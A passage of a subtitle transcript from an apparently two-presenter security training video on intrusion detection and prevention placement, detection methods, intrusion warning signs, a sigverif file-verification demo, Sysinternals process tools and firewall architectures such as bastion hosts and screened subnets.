zero in\n\n121\n00:06:28.330 --> 00:06:32.320\non that information in the larger sets or\nvolumes of data that we generate.\n\n122\n00:06:32.320 --> 00:06:34.480\n&gt;&gt; Have you seen environments\nwhere they might do both?\n\n123\n00:06:34.480 --> 00:06:38.590\nOne general to monitor the entire network\nbut then a particular server that's\n\n124\n00:06:38.590 --> 00:06:43.240\nespecially sensitive and run a host based\non that server as well as a network based?\n\n125\n00:06:43.240 --> 00:06:45.245\n&gt;&gt; Absolutely yes,\nit's a good point to make.\n\n126\n00:06:45.245 --> 00:06:47.115\nWe see a lot of that in many networks.\n\n127\n00:06:47.115 --> 00:06:50.025\nWe will do exactly what Mike described,\nthe two tier architecture,\n\n128\n00:06:50.025 --> 00:06:53.985\nwhere we want the broad monitor,\nbroad application that a NID or\n\n129\n00:06:53.985 --> 00:06:57.030\nNIP will provide to us in terms\nof the network based portion.\n\n130\n00:06:57.030 --> 00:07:00.205\nBut we then want the specificity of\ncertain boxes that we can drill down on.\n\n131\n00:07:00.205 --> 00:07:05.115\nAnd from an auditability perspective,\na compliance perspective perhaps,\n\n132\n00:07:05.115 --> 00:07:09.044\nmaybe a governance risk and\ncompliance consideration here,\n\n133\n00:07:09.044 --> 00:07:13.970\nwe want to be able to have tailored and\nspecific monitoring of a local system.\n\n134\n00:07:13.970 --> 00:07:16.590\nSo, we will add agent based\ndeployments to certain systems.\n\n135\n00:07:16.590 --> 00:07:19.010\nA lot of times databases\nwill be covered that way.\n\n136\n00:07:19.010 --> 00:07:20.900\nWe may or\nmay not deal with web service that way.\n\n137\n00:07:20.900 --> 00:07:24.300\nA lot of times we can do broad\nmonitoring because they sit in the DMZ.\n\n138\n00:07:24.300 --> 00:07:28.500\nSo, we made just simply do a network\nbase device there to watch that traffic\n\n139\n00:07:28.500 --> 00:07:31.140\nbecause we don't tend to have\na lot of boxes in the DMZ.\n\n140\n00:07:31.140 --> 00:07:34.830\nSo a network based deployment although it\nwill capture three or four things will\n\n141\n00:07:34.830 --> 00:07:39.060\nactually be able to very quickly and\neasily zero in on the boxes in the DMZ.\n\n142\n00:07:39.060 --> 00:07:43.101\nBut behind the firewall in the LAN,\nthe internal portion of the DMZ,\n\n143\n00:07:43.101 --> 00:07:45.341\nwe do tend to do targeted monitoring.\n\n144\n00:07:45.341 --> 00:07:48.609\nMail service for instance,\ndatabase service certainly or\n\n145\n00:07:48.609 --> 00:07:53.064\nperhaps domain controllers, so directory\nservices maybe monitored that way.\n\n146\n00:07:53.064 --> 00:07:56.243\nAnd then,\nwe would have a broad coverage overall.\n\n147\n00:07:56.243 --> 00:07:59.158\nIs that we can port all that data out\nto a CiM system traditionally and\n\n148\n00:07:59.158 --> 00:08:01.832\ndo the analytics real time monitoring,\nif you wanna do that.\n\n149\n00:08:01.832 --> 00:08:04.204\nSo, Something that you\nmay wanna think about.\n\n150\n00:08:04.204 --> 00:08:08.290\nSo, let's talk a little bit now that\nwe've talked about placement and\n\n151\n00:08:08.290 --> 00:08:10.400\njust a general architecture.\n\n152\n00:08:10.400 --> 00:08:11.660\nWays we detect an intrusion.\n\n153\n00:08:11.660 --> 00:08:14.560\nWe have been talking about\nnetwork versus host based but\n\n154\n00:08:14.560 --> 00:08:17.300\nwe also talk about the different\nways in which we have this done.\n\n155\n00:08:17.300 --> 00:08:20.260\nI believe we have a list that\nwe can go to quickly for that.\n\n156\n00:08:20.260 --> 00:08:22.000\nIDS, firewalls and Honeypots.\n\n157\n00:08:22.000 --> 00:08:25.090\nDifferent ways to detect\nintrusion based behavior.\n\n158\n00:08:26.140 --> 00:08:28.990\nWhen we look at either on IPS or on IDS,\n\n159\n00:08:28.990 --> 00:08:32.170\nwe're looking at signature based or\nsignature recognition.\n\n160\n00:08:32.170 --> 00:08:34.370\nAnomaly based or anomaly detection.\n\n161\n00:08:34.370 --> 00:08:35.640\nAnd or protocol anomaly,\n\n162\n00:08:35.640 --> 00:08:39.430\na subset of Instead of anomaly detection\nwhich is specific to protocol behavior.\n\n163\n00:08:39.430 --> 00:08:44.121\nSo signature recognition is the idea\nthat we are using signature files.\n\n164\n00:08:44.121 --> 00:08:48.073\nThis is the classic AV right anti virus\nanti malware scanning thought process\n\n165\n00:08:48.073 --> 00:08:49.970\nwhere we download signature files.\n\n166\n00:08:49.970 --> 00:08:53.730\nAnd we're only as good as the signatures\nthat we actually have in the system.\n\n167\n00:08:53.730 --> 00:08:57.930\nAnd so we are looking in doing a\ncomparison of traffic against signatures.\n\n168\n00:08:57.930 --> 00:09:02.450\nIf the traffic matches we take whatever\naction is required, we block it,\n\n169\n00:09:02.450 --> 00:09:04.470\nwe drop it, we log it, who knows what.\n\n170\n00:09:04.470 --> 00:09:07.580\nHow will we allow it through after\nwe do one or more of those things?\n\n171\n00:09:07.580 --> 00:09:09.690\nAnd then, the challenge here and\n\n172\n00:09:09.690 --> 00:09:12.620\nthe downside to this is we're only\nas good as our last update right.\n\n173\n00:09:12.620 --> 00:09:15.780\nSo problem is of course we don't\nhave a signature that deals with\n\n174\n00:09:15.780 --> 00:09:16.730\nthis kind of traffic.\n\n175\n00:09:16.730 --> 00:09:21.170\nAnd this is a problem with zero-day\nexploits, advanced persistent threats that\n\n176\n00:09:21.170 --> 00:09:26.210\nmay come out of nowhere, just bulldoze\nthrough whole sections of networks.\n\n177\n00:09:26.210 --> 00:09:30.620\nIf we don't understand them cuz nobody's\nseen them up until now, the IDS or IPS is\n\n178\n00:09:30.620 --> 00:09:33.700\ngonna be worthless to us cuz we don't\nhave any way of defending against it.\n\n179\n00:09:33.700 --> 00:09:39.760\nSo in these systems, you then typically\nhave to either have a deny kinda rule as\n\n180\n00:09:39.760 --> 00:09:44.470\na catch-all, as we do in firewalls, that\nsays deny all traffic that doesn't match.\n\n181\n00:09:44.470 --> 00:09:47.370\nBut the problem is then you're filtering\ntraffic that you can't account for.\n\n182\n00:09:47.370 --> 00:09:48.880\nSome of that maybe valid traffic.\n\n183\n00:09:48.880 --> 00:09:53.727\nSo it's a problem sometimes to deal with\nthis kind of stuff because the signatures\n\n184\n00:09:53.727 --> 00:09:56.256\nare, you're basically at the behest of or\n\n185\n00:09:56.256 --> 00:10:01.543\nbeing updated based on your other people's\ninformation and gathering of information.\n\n186\n00:10:01.543 --> 00:10:03.699\nYou can write your own rules\nin some of these system,\n\n187\n00:10:03.699 --> 00:10:06.160\ncreate your own signatures but,\nyeah, it's tough to do.\n\n188\n00:10:06.160 --> 00:10:10.550\nIf you ever use a snort for instance or\nany of the old school IDSs.\n\n189\n00:10:10.550 --> 00:10:13.100\nYeah, you can write\nyour own rule sets but,\n\n190\n00:10:13.100 --> 00:10:14.890\nyou got to really know what\nyou're doing to write rules.\n\n191\n00:10:14.890 --> 00:10:15.760\nIt's not easy to do.\n\n192\n00:10:15.760 --> 00:10:18.440\nSo, signature base\nrecognition is one approach\n\n193\n00:10:18.440 --> 00:10:23.240\nAnomaly Detection we are going\nto start out and we're going to\n\n194\n00:10:23.240 --> 00:10:26.120\ncentrally know nothing about\nthe networking when we use this approach.\n\n195\n00:10:26.120 --> 00:10:30.968\nWe're gonna build the protection baseline\nbased on monitoring and analysis of\n\n196\n00:10:30.968 --> 00:10:35.677\nbehavioral characteristics in the system\nand then over time we get smarter.\n\n197\n00:10:35.677 --> 00:10:39.898\nAnd so as a result of that, these systems\ntake time to burn in and we have to do\n\n198\n00:10:39.898 --> 00:10:44.321\na lot of fine adjustments along the way\nto ensure we understand what is normal or\n\n199\n00:10:44.321 --> 00:10:48.090\nwhat is abnormal or abby-normal as\none of my students used to say.\n\n200\n00:10:49.420 --> 00:10:50.560\nAnd so\n\n201\n00:10:50.560 --> 00:10:55.160\nwhen we think about anomaly detection we\nhave to really do a lot of fine tuning to\n\n202\n00:10:55.160 --> 00:10:59.290\nlet the system learn what the expected\nbehavioral norms in the base line will be.\n\n203\n00:10:59.290 --> 00:11:02.270\nThey do get smarter over time so\nlike anything else the more you\n\n204\n00:11:02.270 --> 00:11:06.240\nrun these systems and burn them in, the\nmore you adjust, the better they become.\n\n205\n00:11:06.240 --> 00:11:08.770\nBut they are very sensitive,\nget a lot of false positives.\n\n206\n00:11:08.770 --> 00:11:10.400\nSo we just wanna be aware of that.\n\n207\n00:11:10.400 --> 00:11:12.330\nAnd thing like that can\nbe a bit of an issue.\n\n208\n00:11:12.330 --> 00:11:15.580\nAnd then a subset,\nprotocol anomaly detection.\n\n209\n00:11:15.580 --> 00:11:19.560\nThis is where we are built specifically or\nbuilding specifically models\n\n210\n00:11:19.560 --> 00:11:24.210\nthat are focused on protocols and\nthe anomalies associated with protocols.\n\n211\n00:11:24.210 --> 00:11:27.290\nSo, it's a subset of over-all\nanomaly detection and\n\n212\n00:11:27.290 --> 00:11:31.290\nwe're gonna modify our behavior\nexpectation based on implementation and\n\n213\n00:11:31.290 --> 00:11:33.600\nmanagement and configuration of protocols.\n\n214\n00:11:33.600 --> 00:11:36.440\nSo different ways to do\nintrusion detection, and\n\n215\n00:11:36.440 --> 00:11:40.060\nthis would apply with any of the systems\nthat are out there today, right?\n\n216\n00:11:40.060 --> 00:11:43.520\nWe can essentially see they follow on one\nof these three categories and they operate\n\n217\n00:11:43.520 --> 00:11:47.060\nin one or more of these ways depending\non the kind of system that you buy.\n\n218\n00:11:47.060 --> 00:11:49.200\nSo let's think about host space intrusion.\n\n219\n00:11:49.200 --> 00:11:51.500\nNetwork base intrusion detection or\nprevention.\n\n220\n00:11:51.500 --> 00:11:53.620\nAnd then obviously the ideas behind that.\n\n221\n00:11:53.620 --> 00:11:56.760\nWhat are some of the potential\nwarning signs for\n\n222\n00:11:56.760 --> 00:11:59.260\nthis kind of behavior in terms\nof intrusions happening?\n\n223\n00:11:59.260 --> 00:12:01.700\nYou know we may have incomplete\nlogs that have been modified.\n\n224\n00:12:01.700 --> 00:12:04.370\nSo somebody's may have gone in there and\nplayed around.\n\n225\n00:12:04.370 --> 00:12:05.560\nUnusual designs or\n\n226\n00:12:05.560 --> 00:12:09.380\nunusual graphic text that's displayed\non a machine could be a sign of a hack.\n\n227\n00:12:09.380 --> 00:12:12.000\nThat thing we had going on with your\nmachine when you rebooted would have been\n\n228\n00:12:12.000 --> 00:12:14.670\ngreat, if we had captured that that\nwould have been a great example.\n\n229\n00:12:14.670 --> 00:12:18.940\nMike found a hidden Easter egg in the\nApple iOS that apparently uncovered when\n\n230\n00:12:18.940 --> 00:12:20.670\nhe tried to restart his machine.\n\n231\n00:12:20.670 --> 00:12:24.080\nIt was the flashing face of-\n&gt;&gt; It was of Jolly Roger.\n\n232\n00:12:24.080 --> 00:12:25.310\n&gt;&gt; No, looked like Steve Jobs.\n\n233\n00:12:25.310 --> 00:12:27.550\n&gt;&gt; Yeah. [LAUGH] &gt;&gt; It's looks like\nSteve Jobs laughing at you or something.\n\n234\n00:12:27.550 --> 00:12:29.092\nIt's kinda spooky and crazy.\n\n235\n00:12:29.092 --> 00:12:30.410\n&gt;&gt; [LAUGH]\n&gt;&gt; Yeah, yeah,\n\n236\n00:12:30.410 --> 00:12:31.670\nin the turtleneck and everything.\n\n237\n00:12:31.670 --> 00:12:33.500\nIt was really, really bizarre.\n\n238\n00:12:33.500 --> 00:12:36.670\nAnd then unusually slow\nperformance on the system.\n\n239\n00:12:36.670 --> 00:12:38.010\nYou don't get that on Windows, by the way.\n\n240\n00:12:38.010 --> 00:12:39.636\nWe don't have any of that crazy stuff.\n\n241\n00:12:39.636 --> 00:12:40.250\n&gt;&gt; No, it just works.\n\n242\n00:12:40.250 --> 00:12:41.576\n&gt;&gt; No.\nIt just doesn't work.\n\n243\n00:12:41.576 --> 00:12:43.740\n&gt;&gt; [LAUGH]\n&gt;&gt; It just refuses to work.\n\n244\n00:12:43.740 --> 00:12:45.010\nBut we don't have any in between.\n\n245\n00:12:45.010 --> 00:12:46.570\nIt just doesn't work.\n\n246\n00:12:46.570 --> 00:12:51.160\nSo unusually slow system performance,\nmodifications to config files would also\n\n247\n00:12:51.160 --> 00:12:54.000\nbe a good example of stuff that would\noften happen that we may want to look for.\n\n248\n00:12:54.000 --> 00:12:55.990\nWe're gonna talk about a way\nto deal with that by the way.\n\n249\n00:12:55.990 --> 00:12:57.690\nSpeaking of which,\nlet's do that right now.\n\n250\n00:12:57.690 --> 00:13:00.180\nLet's go live to my machine.\n\n251\n00:13:00.180 --> 00:13:05.860\nAnd so when we are talking about keeping\ntrack of config files and unknown\n\n252\n00:13:05.860 --> 00:13:09.120\nmodifications things like that, I thought\nI'd show you a little built in tool and\n\n253\n00:13:09.120 --> 00:13:14.090\nI've talked about this before on Windows,\non the run line I've got here and this is\n\n254\n00:13:14.090 --> 00:13:17.860\nWindows 10 by the way so this isn't\neven the most recent operating system.\n\n255\n00:13:17.860 --> 00:13:19.380\nA tool called sigverif.\n\n256\n00:13:19.380 --> 00:13:21.720\nAnd I've typed in the sigverif command.\n\n257\n00:13:21.720 --> 00:13:24.560\nYou hit Enter, you'll get the file\nsignature verification tool.\n\n258\n00:13:24.560 --> 00:13:26.440\nYou can run that on any Windows system.\n\n259\n00:13:26.440 --> 00:13:27.726\nIf I'm not mistaken,\n\n260\n00:13:27.726 --> 00:13:31.862\nthis definitely goes back certainly\nto I wanna say I think Windows 95.\n\n261\n00:13:31.862 --> 00:13:36.496\nI could be wrong, but I'm thinking it goes\nback to probably NT forum Windows 95,\n\n262\n00:13:36.496 --> 00:13:37.970\nsome where in there.\n\n263\n00:13:37.970 --> 00:13:41.000\nIt's certainly be around for\nsome time and you can run this.\n\n264\n00:13:41.000 --> 00:13:44.720\nYou just click start,\nit's gonna scan as you can see there.\n\n265\n00:13:44.720 --> 00:13:48.280\nAll the systems DLL's that digitally\nsigned by Microsoft making sure\n\n266\n00:13:48.280 --> 00:13:49.130\nthey are valid.\n\n267\n00:13:49.130 --> 00:13:51.900\nIf we find any that are not for\nany reason, they will be flagged,\n\n268\n00:13:51.900 --> 00:13:54.590\nand we'll have a little\nsecurity alert go off.\n\n269\n00:13:54.590 --> 00:13:56.709\nWe'll be able to take\nsome remediative action.\n\n270\n00:13:56.709 --> 00:13:59.790\nAll the lights will dim,\nwe'll hear some chanting,\n\n271\n00:13:59.790 --> 00:14:03.100\nthere'll be procession with candles,\nthat kind of thing.\n\n272\n00:14:03.100 --> 00:14:06.600\nBut for now, we see that it says hey,\nyour files have been scanned and\n\n273\n00:14:06.600 --> 00:14:09.840\nverified, and are digitally signed\nwhich means that everything is good.\n\n274\n00:14:09.840 --> 00:14:12.960\nAnd so this will be a very\nsimple Tripwire system, right?\n\n275\n00:14:12.960 --> 00:14:18.010\nVery very simple but effective way to do\nfile signature verification on a system.\n\n276\n00:14:18.010 --> 00:14:20.160\nAnd there you can run\nthe equivalent tool sets.\n\n277\n00:14:20.160 --> 00:14:23.514\nIn Linux they're obviously not file\nverification with sigverif but\n\n278\n00:14:23.514 --> 00:14:26.421\nwe have tools that will do this\nin the Linux and Unix system.\n\n279\n00:14:26.421 --> 00:14:31.157\nYou could get Tripwire, a software\npackage we can use in Windows to do this,\n\n280\n00:14:31.157 --> 00:14:32.716\nlots of different ways.\n\n281\n00:14:32.716 --> 00:14:36.382\nThere's also a command line version\nof sigverif you could download from\n\n282\n00:14:36.382 --> 00:14:37.052\nMicrosoft.\n\n283\n00:14:37.052 --> 00:14:38.538\nThat you can from their\nDownload Center and\n\n284\n00:14:38.538 --> 00:14:40.690\nthat essentially does the same\nthing from the command shell.\n\n285\n00:14:40.690 --> 00:14:42.495\n&gt;&gt; FCIV or something like that, yeah.\n\n286\n00:14:42.495 --> 00:14:44.060\n&gt;&gt; Yeah, yeah, exactly,\nso you could do that.\n\n287\n00:14:44.060 --> 00:14:45.285\nSo just keep that in mind,\n\n288\n00:14:45.285 --> 00:14:48.405\njust a quick way to show you\nfile signature verification,\n\n289\n00:14:48.405 --> 00:14:51.820\nsince we're talking about different\nthings that may be warning signs.\n\n290\n00:14:51.820 --> 00:14:54.870\nThat's right,\nwith regards to intrusion and/or\n\n291\n00:14:54.870 --> 00:14:56.420\nunderstanding we may have been hacked.\n\n292\n00:14:56.420 --> 00:14:58.760\nThis is one of the things you\nmay wanna run every so often.\n\n293\n00:14:58.760 --> 00:15:01.280\nAnd just keep an eye out,\nthis will check those files.\n\n294\n00:15:01.280 --> 00:15:04.270\nNow the nice thing about something\nlike Tripwire, which I just mentioned,\n\n295\n00:15:04.270 --> 00:15:06.747\nwould be that we can actually program\nin the list of files we wanna monitor.\n\n296\n00:15:06.747 --> 00:15:10.300\nSigverif is really just built\nspecifically to monitor certain tools or\n\n297\n00:15:10.300 --> 00:15:14.790\nrather certain files that Microsoft has\ndeemed as being critical to the core OS,\n\n298\n00:15:14.790 --> 00:15:16.420\nand as a result, a digitally signed.\n\n299\n00:15:16.420 --> 00:15:19.160\nAnd the tool doesn't really have any\nconfiguration options for you to go in and\n\n300\n00:15:19.160 --> 00:15:21.260\nsay, scan these other files.\n\n301\n00:15:21.260 --> 00:15:23.930\nBut with something like Tripwire,\nwe actually can do that and\n\n302\n00:15:23.930 --> 00:15:26.910\nsay I wanna scan these config files,\nI wanna scan the host file.\n\n303\n00:15:26.910 --> 00:15:28.240\nI wanna scan the OM host file.\n\n304\n00:15:28.240 --> 00:15:31.100\nI wanna scan this directory or\nwhatever it is, and\n\n305\n00:15:31.100 --> 00:15:32.500\nI can actually go look at certain stuff.\n\n306\n00:15:32.500 --> 00:15:34.600\nSo it's cool like that, just maybe nice.\n\n307\n00:15:34.600 --> 00:15:37.870\nWe talked about missing logs,\nshort logs, things like that.\n\n308\n00:15:37.870 --> 00:15:41.900\nSystem crashes or reboots that are out\nof the ordinary, out of the norm.\n\n309\n00:15:41.900 --> 00:15:44.430\nProcesses that are running\nthat are not familiar, right,\n\n310\n00:15:44.430 --> 00:15:45.680\nthat you may wanna think about.\n\n311\n00:15:45.680 --> 00:15:50.370\nCan you pull up the systems tool,\nset the page at a Microsoft real quick.\n\n312\n00:15:50.370 --> 00:15:51.460\nJust let me know when you're ready.\n\n313\n00:15:51.460 --> 00:15:52.290\nWe'll just take a look at that.\n\n314\n00:15:52.290 --> 00:15:53.310\nJust a couple of tools on there.\n\n315\n00:15:53.310 --> 00:15:54.670\nWe'll could take a look out for that.\n\n316\n00:15:54.670 --> 00:15:59.716\nThings like plist and process explorer\nthat would allow us to see what's running.\n\n317\n00:15:59.716 --> 00:16:03.022\nOne of the issues with this is that\nwhen you're going to task manager,\n\n318\n00:16:03.022 --> 00:16:05.263\nyou don't see all the things\nthat are running,\n\n319\n00:16:05.263 --> 00:16:07.801\ncuz we sometimes stealth\nprocesses from the system.\n\n320\n00:16:07.801 --> 00:16:12.129\nA tool like this and the Sysinternals tool\nset which Microsoft bought a few years\n\n321\n00:16:12.129 --> 00:16:15.120\nback and now obviously offers\nus just free downloads.\n\n322\n00:16:15.120 --> 00:16:18.410\nSo we like the fact that they still\nkept everything available and\n\n323\n00:16:18.410 --> 00:16:20.470\ncontinuing development\non some of these tools.\n\n324\n00:16:20.470 --> 00:16:23.770\nRussinovich is still doing work on\nhis tool set here, so that's nice.\n\n325\n00:16:23.770 --> 00:16:28.610\nBut you've got a whole list of tools that\nyou can get from the Sysinternals website\n\n326\n00:16:28.610 --> 00:16:32.348\nor now the Windows Sysinternals,\nwhatever the hell it is, website there.\n\n327\n00:16:32.348 --> 00:16:32.960\n&gt;&gt; [LAUGH]\n&gt;&gt; And so\n\n328\n00:16:32.960 --> 00:16:36.457\nsome of the ones that you\nmay wanna look at, Plist,\n\n329\n00:16:36.457 --> 00:16:39.260\nPE Explorer, Process Explorer,\nProcess List.\n\n330\n00:16:39.260 --> 00:16:42.740\nIn Linux, Unix, you have List,\nyou have Top, you have Proc.\n\n331\n00:16:42.740 --> 00:16:46.240\nThese are command line tools\nthat will show you the processes\n\n332\n00:16:46.240 --> 00:16:48.970\nthat are running and\ndifferent ways to see that.\n\n333\n00:16:48.970 --> 00:16:52.560\nIt's essentially a command line\nversion of Task Manager, right, so\n\n334\n00:16:52.560 --> 00:16:54.940\njust wanna think about that and\nbe aware of that.\n\n335\n00:16:54.940 --> 00:16:58.900\nSo this is gonna allow us to be able\nto see the equivalent in Windows.\n\n336\n00:16:58.900 --> 00:17:02.830\nAnd so when we run something like Plist,\nwe're gonna get a command line version,\n\n337\n00:17:02.830 --> 00:17:06.510\nessentially a ported version of List or\nTop or Proc into Windows.\n\n338\n00:17:06.510 --> 00:17:10.670\nBut a command line version of the Task\nManager, but without the GUI overhead.\n\n339\n00:17:10.670 --> 00:17:13.133\nAnd it's gonna give us, usually,\nnot always, depends on whether or\n\n340\n00:17:13.133 --> 00:17:14.490\nnot there are any stealth processes.\n\n341\n00:17:14.490 --> 00:17:17.330\nBut assuming there are,\nit's gonna give us a different view\n\n342\n00:17:17.330 --> 00:17:19.430\nof the system than what we\nwould see with Task Manager.\n\n343\n00:17:19.430 --> 00:17:20.880\nAnd so that's something to consider.\n\n344\n00:17:20.880 --> 00:17:25.360\nProcess Explorer is essentially like Task\nManager, it's basically an equivalent.\n\n345\n00:17:25.360 --> 00:17:27.350\nIt just has some more bells and\nwhistles in it.\n\n346\n00:17:27.350 --> 00:17:30.420\nBut if you really wanna get under\nthe hood, Plist would be the way to go.\n\n347\n00:17:30.420 --> 00:17:31.160\nSo that's gonna be down there.\n\n348\n00:17:31.160 --> 00:17:31.770\nIt's alphabetical.\n\n349\n00:17:31.770 --> 00:17:32.840\nYou can find it on the page.\n\n350\n00:17:32.840 --> 00:17:34.330\nSo there's just a lot different stuff.\n\n351\n00:17:34.330 --> 00:17:38.750\nThis tool set is really, really good from\nthe perspective of being a Windows app,\n\n352\n00:17:38.750 --> 00:17:40.230\nand running this on the Windows systems.\n\n353\n00:17:40.230 --> 00:17:43.200\nSo there's a lot of stuff in there\nyou may wanna go take a look at.\n\n354\n00:17:43.200 --> 00:17:46.180\nSo just some things to consider and\nbe aware of, right?\n\n355\n00:17:46.180 --> 00:17:50.460\nWe obviously wanna, as we talk about\nboth network and host based IDSs, yeah,\n\n356\n00:17:50.460 --> 00:17:54.090\nwe did talk about the fact, although I\ndidn't mention it when we talked about it,\n\n357\n00:17:54.090 --> 00:17:55.380\nthat we have both those types.\n\n358\n00:17:55.380 --> 00:17:57.710\nBut we also don't wanna\nforget the wireless solution,\n\n359\n00:17:57.710 --> 00:18:01.420\nright, we have a both wireless intrusion\nprevention and intrusion detection.\n\n360\n00:18:01.420 --> 00:18:05.140\nSo we have wids and wips, along with\nnids and nips, and hids and hips.\n\n361\n00:18:05.140 --> 00:18:06.280\nSo we just wanna make sure we understand.\n\n362\n00:18:06.280 --> 00:18:09.690\nWe actually can see these propagating\nacross multiple different\n\n363\n00:18:09.690 --> 00:18:11.070\narchitecture types.\n\n364\n00:18:11.070 --> 00:18:13.290\nWe also have firewalls.\n\n365\n00:18:13.290 --> 00:18:16.840\nFirewalls these days,\nprobably every end point device for\n\n366\n00:18:16.840 --> 00:18:20.050\nthe most part has a firewall built\ninto its operating system today.\n\n367\n00:18:20.050 --> 00:18:22.340\nWhether we choose to use them or\nnot is another question.\n\n368\n00:18:22.340 --> 00:18:25.070\nWe should be using them,\nthey add additional layers of protection.\n\n369\n00:18:25.070 --> 00:18:28.200\nBut it is important to understand\nthe basic concepts of the firewall.\n\n370\n00:18:28.200 --> 00:18:31.410\nI know that we have a little list of\ndifferent types of firewalls that\n\n371\n00:18:31.410 --> 00:18:32.210\nwe put together.\n\n372\n00:18:32.210 --> 00:18:33.803\nCan we put that up real quick?\n\n373\n00:18:33.803 --> 00:18:36.213\nDo you have that vocabulary definition\nlist, the types of firewalls?\n\n374\n00:18:36.213 --> 00:18:40.690\nIt was right below the IDS IPS\nconversation, I think.\n\n375\n00:18:40.690 --> 00:18:41.790\n&gt;&gt; I didn't close that.\n\n376\n00:18:41.790 --> 00:18:42.330\n&gt;&gt; You did not close that.\n\n377\n00:18:42.330 --> 00:18:44.242\n&gt;&gt; Okay, well, while Mike is looking for-\n&gt;&gt; Here it is right here.\n\n378\n00:18:44.242 --> 00:18:46.300\n&gt;&gt; There we go.\n&gt;&gt; Okay, so while Mike is ready for\n\n379\n00:18:46.300 --> 00:18:48.730\nus to take a look at those definitions.\n\n380\n00:18:48.730 --> 00:18:51.120\nAs soon as you are ready, sir, tell us and\nwe'll go and we'll take a look.\n\n381\n00:18:51.120 --> 00:18:53.070\nSo we've got firewall architecture there.\n\n382\n00:18:53.070 --> 00:18:57.820\nWe've got the Bastion host, a term that we\noften we hear about and talk about, and\n\n383\n00:18:57.820 --> 00:18:59.310\npeople don't always define the right way.\n\n384\n00:18:59.310 --> 00:19:02.050\nI thought it was a good idea to make sure\nwe're comfortable with these definitions.\n\n385\n00:19:02.050 --> 00:19:05.800\nSo you'll see we've got the Bastion host,\nessentially just a computer, right,\n\n386\n00:19:05.800 --> 00:19:08.240\ndesigned and\nconfigured to protect resources.\n\n387\n00:19:08.240 --> 00:19:10.850\nWe force all traffic to go\nthrough this machine and\n\n388\n00:19:10.850 --> 00:19:13.790\nthe machine is acting as\na firewall as a result of that.\n\n389\n00:19:13.790 --> 00:19:18.020\nWe have two interfaces, so imagine\na machine with two network cards, right.\n\n390\n00:19:18.020 --> 00:19:21.700\nAnd so we've got a public interface\ndirectly connected out to the Internet and\n\n391\n00:19:21.700 --> 00:19:24.480\nwe have a private interface\nconnected to the intranet.\n\n392\n00:19:24.480 --> 00:19:28.410\nSo this would be a traditional firewall\nin many respects that you think about.\n\n393\n00:19:28.410 --> 00:19:32.650\nIt does not have to be a firewall\nthat is a hardware based firewall.\n\n394\n00:19:32.650 --> 00:19:34.170\nThis could be a Windows machine or\n\n395\n00:19:34.170 --> 00:19:38.200\na Linux machine running software\nthat allows it to act as a firewall.\n\n396\n00:19:38.200 --> 00:19:39.190\nAnd as a result of that,\n\n397\n00:19:39.190 --> 00:19:42.840\ncould simply be a multihomed machine\nthat will act as a firewall.\n\n398\n00:19:42.840 --> 00:19:45.310\nBut it is a Bastion host\nbecause it is hardened.\n\n399\n00:19:45.310 --> 00:19:48.070\nIt is really just running the bare\nminimum and set up to do this.\n\n400\n00:19:48.070 --> 00:19:49.950\nSo we just wanna make\nsure we understand that.\n\n401\n00:19:49.950 --> 00:19:52.950\nWe have the screened subnet,\ntraditional DMZ behavior.\n\n402\n00:19:52.950 --> 00:19:58.090\nWe saw that in the diagram we looked at\nwith IDSes, IPSes, right, where we have\n\n403\n00:19:58.090 --> 00:20:02.300\none firewall, some sort of semi-public,\nsemi-private space between the two.\n\n404\n00:20:02.300 --> 00:20:04.560\nAnd then another firewall facing internal.\n\n405\n00:20:04.560 --> 00:20:07.790\nBehind it we have the LAN, so\ntotally private highly secured.\n\n406\n00:20:07.790 --> 00:20:09.640\nWe have the medium security or\n\n407\n00:20:09.640 --> 00:20:12.580\nmedium security zone protection\nspace between the two firewalls.\n\n408\n00:20:12.580 --> 00:20:17.550\nAnd then the outside world beyond the\nexternal firewall that is considered to be\n\n409\n00:20:17.550 --> 00:20:19.240\ntotally open and therefore not protected.\n\n410\n00:20:19.240 --> 00:20:22.740\nRight, so just able to think about that or\nable to think through that.\n\n411\n00:20:22.740 --> 00:20:26.700\nAnd then a multihomed firewall is a\nfirewall with multiple connections on it,\n\n412\n00:20:26.700 --> 00:20:31.210\ntwo or more interfaces, that allows\nfurther subdivision of our network into\n\n413\n00:20:31.210 --> 00:20:35.570\na lot of different subnets or\ndifferent areas, protection zones.\n\n414\n00:20:36.890 --> 00:20:38.740\nYou could think of these as enclaves.\n\n415\n00:20:38.740 --> 00:20:42.465\nYou hear different terminologies\ndepending on where you come from, and\n\n416\n00:20:42.465 --> 00:20:46.350\nif your focus is more government military,\nmore private sector.\n\n417\n00:20:46.350 --> 00:20:50.040\nBut at the end of the day, imagine\na firewall that's got at least, let's say,\n\n418\n00:20:50.040 --> 00:20:51.920\ntwo or three or four ports on it.\n\n419\n00:20:51.920 --> 00:20:55.110\nAnd we're then sending those connections\nout to different interfaces that\n\n420\n00:20:55.110 --> 00:20:59.770\nwill connect us to different areas for\ndifferent information processing and\n\n421\n00:20:59.770 --> 00:21:01.360\nor different system requirements.\n\n422\n00:21:01.360 --> 00:21:03.810\nThat's what a multihomed\nfirewall will look like.\n\n423\n00:21:03.810 --> 00:21:08.358\nSo just some different ideas there and\nsome things to think about and consider.\n\n424\n00:21:08.358 --> 00:21:10.930\nAll right, so we've talked a little\nbit about firewall architecture.\n\n425\n00:21:10.930 --> 00:21:14.020\nWe've talked about the concept of the DMZ.\n\n426\n00:21:14.020 --> 00:21:18.690\nA lot of times people think about DMZs and\nthey think about the traditional DMZs.\n\n427\n00:21:18.690 --> 00:21:21.400\nThey think about the fact that we have\nthe two firewalls as we described.\n\n428\n00:21:21.400 --> 00:21:24.730\nCould we actually put that\npicture back up of the IDS IPS\n\n429\n00:21:24.730 --> 00:21:28.270\njust to show the traditional firewalls or\nthe traditional DMZ, rather,\n\n430\n00:21:28.270 --> 00:21:29.840\nis what I mean to say?\n\n431\n00:21:29.840 --> 00:21:30.910\n&gt;&gt; We'll give it one\nsecond to load up there.\n\n432\n00:21:30.910 --> 00:21:32.470\n&gt;&gt; Okay, no problem,\nI will just sit quietly and wait.\n\n433\n00:21:32.470 --> 00:21:33.492\nAnd I'm actually gonna-\n&gt;&gt; There we go.\n\n434\n00:21:33.492 --> 00:21:36.247\n&gt;&gt; Do this while we're waiting just cuz\nI've always wanted to do that on camera.\n\n435\n00:21:36.247 --> 00:21:37.911\n[LAUGH]\n&gt;&gt; All right, so hey,\n\n436\n00:21:37.911 --> 00:21:39.670\nnever a dull moment here.\n\n437\n00:21:39.670 --> 00:21:41.766\nStop shaking your head at me.\n\n438\n00:21:41.766 --> 